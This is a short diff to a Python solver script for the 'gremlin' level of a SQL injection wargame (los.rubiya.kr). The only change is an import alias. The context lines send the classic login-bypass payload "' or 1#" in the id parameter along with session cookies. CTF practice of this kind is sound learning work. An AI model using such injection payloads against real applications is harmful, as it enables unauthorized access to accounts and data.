@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 import los
-import los_cookies
+import los_cookies as lc
 from connect import my_request as req
 
 
@@ -17,7 +17,7 @@ def main():
     '''
 
     url = "https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php"
-    cook = los_cookies.check_cookies(url)
+    cook = lc.check_cookies(url)
 
     param = dict(id="' or 1#")
     response = req.get_request(url, param, cook)
